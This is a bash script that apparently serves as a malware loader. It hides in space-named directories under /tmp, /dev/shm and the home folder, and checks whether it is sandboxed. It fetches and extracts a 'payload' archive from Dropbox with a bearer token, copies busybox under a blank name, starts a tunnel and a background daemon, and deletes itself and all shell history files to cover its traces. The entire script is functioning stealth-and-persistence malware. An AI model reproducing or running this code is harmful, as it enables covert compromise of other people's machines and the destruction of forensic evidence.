#!/usr/bin/env bash
## needed tmux sed grep envsubst

## load customization variables
[ -f env.sh ] && . ./env.sh && STARTING_VARS=$(<env.sh) && rm -f env.sh
STARTING_VARS="$STARTING_VARS pl_mask=$pl_mask pl_ep=$pl_ep pl_token=$pl_token pl_name=$pl_name"
STARTING_PATH=${STARTING_PATH:-$PATH}
STARTING_PID=$BASHPID

## removing tmppath too early might be a race cond, let it be called by switch
cleanup() {
    ppath="${tmppath%\/*}"
    previouspaths="$(compgen -G "${ppath}/.\ *")"
    cd "$ppath"
    previfs=$IFS
    IFS=$'\n';
    for p in ${previouspaths}; do
        rm -rf "${p}"
    done
    IFS=$previfs
    rm -rf "$tmppath" "scripts-${BRANCH}" \
       -- "$0" \
       "dig" "cookie" "env.sh" "../env.sh" \
       "$HOME"/.*_history ~/.*_history /.*_history
    mkdir "$tmppath" && cd "$tmppath" ## now use tmppath only to store tmp bins
    mv "../$bb" "$tmppath/"
    link_bb "$bb"
    # [ -n "$tmppath" ] && find ${tmppath}/${dir} \
        #                           ! -name "$OBJ_MASK" \
        #                           ! -name "$OBJ_CFG_MASK" \
        #                           -delete
}

pathx() {
    cd "${1}"
    touch test.sh &&
    chmod +x test.sh &&
    ./test.sh && rm -f test.sh ||
            { rm -f test.sh && return 1; }
}

tmppath() {
    local pathname=$(printf ".%-$((RANDOM%9+1))s")
    # if tmppath=$($bb mktemp -d -t .XXXXXXXX) && pathx $tmppath; then
    #     export PATH=${tmppath}:${PATH} tmppath
    # else
    for ph in {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.local,~/.cache,~/}; do
        rm -rf "$ph/$pathname" &&
            mkdir -p "$ph/$pathname" &&
            tmppath="$ph/$pathname" &&
            pathx "$tmppath" &&
            export PATH="${ph}/$pathname:${PATH}" tmppath &&
            break
    done
    # fi
}
tmppath
[ -n "$tmppath" ] && cd "$tmppath"

jailjudge() {
    ## where are we
    c=$(builtin compgen -G '/etc/cpa*')
    d=$(builtin compgen -G '/dev/*')
    s=$(builtin compgen -G '/sys/*')
    p=$(builtin compgen -G '/proc/*')
    jail=
    if [ -n "$c" -o -z "$d" -o -z "$s" -o -z "$p" ]; then ## we are in a jail
        jail=1
    fi
}
jailjudge

## examples with wget/curl using private token
# wget --method=POST \
#      --header 'Authorization: Bearer ${pl_token}' \
#      --header 'Dropbox-API-Arg: {"path":"/${name}${format}"}' \
#      https://content.dropboxapi.com/2/files/download -O "${name}${format}"
# curl -X POST \
#      https://content.dropboxapi.com/2/files/download \
#      --header 'Authorization: Bearer ${pl_token}'\
#      --header 'Dropbox-API-Arg: {"path":"/${name}${format}"}' -o "${name}${format}"

getpayload(){
    ## get payload from dbx
    local mask=${pl_mask:-:ep/:token/:name}
    local ep=${pl_ep:-https://dl.dropboxusercontent.com/s}
    local token=${pl_token:-xxxxxxxxxxxxxxx}
    local name=${pl_name:-payload}
    local format extract fetch
    type unzip &>/dev/null && format=".zip" extract="unzip -q" || format=".tar.gz" extract="tar xf"
    uri="$(eval "echo ${mask//:/$}")"
    # echo "$fetch $uri $extract $name $format" >/tmp/wat
    if type wget &>/dev/null; then
        echo "$uri" | wget -q -i- -O- > "${name}${format}"
    else
        echo "url = $uri
output = ${name}${format}
" > .curlrc
        CURL_HOME=$PWD curl -sOL
        rm -f .curlrc
    fi
    [ "${tmppath/ }" = "$tmppath" ] && { log "something is wrong with the tmppath!? aborting" && exit 1; }
    $extract "${name}${format}" && rm "${name}${format}" || { log "problems with payload." && exit 1; }
    # tar xf ${BRANCH}.tar.gz && rm ${BRANCH}.tar.gz
    # cd ${REPO}-${BRANCH} || exit 1
}
getpayload || exit 1

. ./functions || exit 1

fleep 1

## utility vars
# CFG_BASE_URL=

## env vars and busybox
export PATH=.:pl:$PATH
bb=" "
## link busybox applets, all the applets used should go here
link_bb() {
    ln -s "$1" "base64"
}
cp "$(get_path busybox)" "$tmppath/../$bb" && chmod +x "$tmppath/../$bb"
link_bb "$tmppath/../$bb"

## choose masks
. ./masks || exit 1

## start tunnel
. ./tstarter || exit 1
setup_tnl

## config object
. ./objconfig || exit 1

## start the pausd daemon passing the object args
. ./pausd || exit 1
. ./switch || exit 1

fleep 1

## check for alternate if fail
# slept=0
# while [ "$(jobs -r | wc -l)" -lt 2 ]; do
#     slept=$((slept+1))
#     if [ $slept -gt 5 ]; then ## no aes means crash means aeon
#         ## altconfig
#         . ./altconfig
#         ## init
#         start &
#         break
#     fi
#     fleep 1
# done
# fleep 1 ## once more for edge cases



## debug
if [ -n "$DEBUG" ]; then
    env > dump.env
    trap - SIGINT EXIT SIGKILL SIGTERM
    fleep $DEBUG
    kill -9 $BASHPID
fi

fleep 1
start
